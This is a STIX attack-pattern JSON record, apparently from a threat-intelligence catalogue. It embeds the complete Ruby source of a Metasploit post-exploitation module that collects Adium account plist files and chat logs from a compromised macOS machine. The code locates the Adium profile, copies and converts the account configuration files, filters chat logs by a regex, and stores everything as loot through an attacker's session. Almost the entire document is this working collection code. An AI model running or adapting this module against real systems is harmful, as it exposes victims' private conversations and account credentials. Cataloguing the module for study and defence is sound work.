{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--71824080-b07a-4e54-930e-4c92801aec23",
    "created": "2024-08-14T16:33:00.701508Z",
    "modified": "2024-08-14T16:33:00.701512Z",
    "name": "OS X Gather Adium Enumeration",
    "description": " This module will collect Adium's account plist files and chat logs from the victim's machine.  There are three different actions you may choose: ACCOUNTS CHATS, and ALL.  Note that to use the 'CHATS' action, make sure you set the regex 'PATTERN' option in order to look for certain log names (which consists of a contact's name, and a timestamp).  The current 'PATTERN' option is configured to look for any log created on February 2012 as an example.  To loot both account plists and chat logs, simply set the action to 'ALL'.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/enum_adium.rb",
            "external_id": "enum_adium.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Gather Adium Enumeration',\n        'Description' => %q{\n          This module will collect Adium's account plist files and chat logs from the\n          victim's machine.  There are three different actions you may choose: ACCOUNTS,\n          CHATS, and ALL.  Note that to use the 'CHATS' action, make sure you set the regex\n          'PATTERN' option in order to look for certain log names (which consists of a\n          contact's name, and a timestamp).  The current 'PATTERN' option is configured to\n          look for any log created on February 2012 as an example.  To loot both account\n          plists and chat logs, simply set the action to 'ALL'.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'sinn3r'],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Actions' => [\n          ['ACCOUNTS', { 'Description' => 'Collect account-related plists' } ],\n          ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],\n          ['ALL', { 'Description' => 'Collect both account plists and chat logs' }]\n        ],\n        'DefaultAction' => 'ALL'\n      )\n    )\n\n    register_options(\n      [\n        OptRegexp.new('PATTERN', [true, 'Match a keyword in any chat log\\'s filename', '\\(2012\\-02\\-.+\\)\\.xml$']),\n      ]\n    )\n  end\n\n  #\n  # Parse a plst file to XML format:\n  # http://hints.macworld.com/article.php?story=20050430105126392\n  #\n  def plutil(filename)\n    exec(\"plutil -convert xml1 #{filename}\")\n    data = exec(\"cat #{filename}\")\n    return data\n  end\n\n  #\n  # Collect logs files.\n  # Enumerate all the xml files (logs), filter out the ones we want, and then\n  # save each in a hash.\n  #\n  def get_chatlogs(base)\n    base = \"#{base}Logs/\"\n\n    #\n    # Find all the chat folders for all the victim's contacts and groups\n    #\n    print_status(\"#{@peer} - Gathering folders for chatlogs...\")\n    targets = []\n    dir(base).each do |account|\n      dir(\"#{base}#{account}/\").each do |contact|\n        # Use 'find' to enumerate all the xml files\n        base_path = \"#{base}#{account}/#{contact}\"\n        logs = exec(\"find #{base_path} -name *.xml\").split(\"\\n\")\n        next if logs =~ /No such file or directory/\n\n        # Filter out logs\n        filtered_logs = []\n        logs.each do |log|\n          next unless log =~ datastore['PATTERN']\n\n          # For debugging purposes, we print all the matches\n          vprint_status(\"Match: #{log}\")\n          filtered_logs << log\n        end\n\n        targets << {\n          account: account,\n          contact: contact,\n          log_paths: filtered_logs\n        }\n      end\n    end\n\n    #\n    # Save all the logs to a folder\n    #\n    logs = []\n    targets.each do |target|\n      log_size = target[:log_paths].length\n      contact = target[:contact]\n      account = target[:account]\n\n      # Nothing was actually downloaded, skip this one\n      next if log_size == 0\n\n      print_status(\"#{@peer} - Looting #{log_size} chats with #{contact} (#{account})\")\n      target[:log_paths].each do |log|\n        log = \"\\\"#{log}\\\"\"\n        data = exec(\"cat #{log}\")\n        logs << {\n          account: account,\n          contact: contact,\n          data: data\n        }\n        # break\n      end\n    end\n\n    return logs\n  end\n\n  #\n  # Get AccountPrefs.plist, Accounts.plist, AccountPrefs.plist.\n  # Return: [ {:filename=> String, :data => String} ]\n  #\n  def get_account_info(base)\n    files = [ 'Account\\\\ Status.plist', 'Accounts.plist', 'AccountPrefs.plist' ]\n    loot = []\n\n    files.each do |file|\n      #\n      # Make a copy of the file we want to convert and steal\n      #\n      fpath = \"#{base}#{file}\"\n      rand_name = \"/tmp/#{Rex::Text.rand_text_alpha(5)}\"\n      tmp = exec(\"cp #{fpath} #{rand_name}\")\n\n      if tmp =~ /No such file or directory/\n        print_error(\"#{@peer} - Not found: #{fpath}\")\n        next\n      end\n\n      #\n      # Convert plist to xml\n      #\n      print_status(\"#{@peer} - Parsing: #{file}\")\n      xml = plutil(rand_name)\n\n      #\n      # Save data, and then clean up\n      #\n      if xml.empty?\n        print_error(\"#{@peer} - Unalbe to parse: #{file}\")\n      else\n        loot << { filename: file, data: xml }\n        exec(\"rm #{rand_name}\")\n      end\n    end\n\n    return loot\n  end\n\n  #\n  # Do a store_root on all the data collected.\n  #\n  def save(type, data)\n    case type\n    when :account\n      data.each do |e|\n        e[:filename] = e[:filename].gsub(/\\\\ /, '_')\n        p = store_loot(\n          'adium.account.config',\n          'text/plain',\n          session,\n          e[:data],\n          e[:filename]\n        )\n\n        print_good(\"#{@peer} - #{e[:filename]} stored as: #{p}\")\n      end\n\n    when :chatlogs\n      data.each do |e|\n        account = e[:account]\n        contact = e[:contact]\n        data = e[:data]\n\n        p = store_loot(\n          'adium.chatlog',\n          'text/plain',\n          session,\n          data,\n          contact\n        )\n\n        print_good(\"#{@peer} - #{contact}'s (#{account}) chat log stored as: #{p}\")\n      end\n\n    end\n  end\n\n  #\n  # Get current username\n  #\n  def whoami\n    exec('/usr/bin/whoami')\n  end\n\n  #\n  # Return an array or directory names\n  #\n  def dir(path)\n    subdirs = exec(\"ls -l #{path}\")\n    return [] if subdirs =~ /No such file or directory/\n\n    items = subdirs.scan(/[A-Z][a-z][a-z]\\x20+\\d+\\x20[\\d:]+\\x20(.+)$/).flatten\n    return items\n  end\n\n  #\n  # This is just a wrapper for cmd_exec(), except it chomp() the output,\n  # and retry under certain conditions.\n  #\n  def exec(cmd)\n    out = cmd_exec(cmd).chomp\n  rescue ::Timeout::Error => e\n    vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n    retry\n  rescue EOFError => e\n    vprint_error(\"#{@peer} - #{e.message} - retrying...\")\n    retry\n  end\n\n  #\n  # We're not sure the exact name of the folder becuase it contains a version number.\n  # We'll just check every folder name, and whichever contains the word \"Adium\",\n  # that's the one we'll use.\n  #\n  def locate_adium(base)\n    dir(base).each do |folder|\n      m = folder.match(/(Adium \\d+\\.\\d+)$/)\n      if m\n        m = m[0].gsub(/\\x20/, '\\\\\\\\ ') + '/'\n        return \"#{base}#{m}\"\n      end\n    end\n\n    return nil\n  end\n\n  def run\n    #\n    # Make sure there's an action name before we do anything\n    #\n    if action.nil?\n      print_error('Please specify an action')\n      return\n    end\n\n    @peer = \"#{session.session_host}:#{session.session_port}\"\n    user = whoami\n\n    #\n    # Check adium.  And then set the default profile path\n    #\n    base = \"/Users/#{user}/Library/Application\\\\ Support/\"\n    adium_path = locate_adium(base)\n    if adium_path\n      print_status(\"#{@peer} - Found adium: #{adium_path}\")\n      adium_path += 'Users/Default/'\n    else\n      print_error(\"#{@peer} - Unable to find adium, will not continue\")\n      return\n    end\n\n    #\n    # Now that adium is found, let's download some stuff\n    #\n    account_data = get_account_info(adium_path) if action.name =~ /ALL|ACCOUNTS/i\n    chatlogs = get_chatlogs(adium_path) if action.name =~ /ALL|CHATS/i\n\n    #\n    # Store what we found on disk\n    #\n    save(:account, account_data) if !account_data.nil? && !account_data.empty?\n    save(:chatlogs, chatlogs) if !chatlogs.nil? && !chatlogs.empty?\n  end\nend\n\n=begin\nAdium:\n/Users/[username]/Library/Application\\ Support/Adium\\ 2.0/\n=end\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}